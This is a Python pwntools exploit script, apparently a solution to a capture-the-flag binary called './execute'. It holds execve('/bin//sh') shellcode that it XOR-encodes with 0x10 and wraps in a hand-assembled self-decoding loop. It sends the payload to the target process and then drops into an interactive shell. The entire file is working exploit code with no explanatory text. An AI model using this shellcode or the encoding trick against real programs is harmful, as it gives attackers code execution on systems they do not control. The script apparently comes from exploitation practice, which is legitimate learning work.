#!/usr/bin/python3
from pwn import process, context, asm

shell = process("./execute")
context.arch = "amd64"

def xor_bytes(shellcode):
    output = bytearray()

    for byte in shellcode:
        xored_byte = byte ^ 0x10
        output.append(xored_byte)

    return output

shellcode = b"\x6a\x3b\x58\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x99\x0f\x05"
xored_shellcode = xor_bytes(shellcode)

shellcode  = b""
shellcode += asm("push 0x17")
shellcode += asm("pop rbx")
shellcode += asm("lea rsi, [rsp + 0x42]")
shellcode += asm("jmp $+0x19")
shellcode += xored_shellcode
shellcode += asm("xor byte ptr [rsi], 0x10")
shellcode += asm("dec bl")
shellcode += asm("inc rsi")
shellcode += asm("cmp bl, bh")
shellcode += asm("jnz $-0xa")
shellcode += asm("jmp $-0x23")

shell.sendafter(b"\n", shellcode)
shell.interactive()
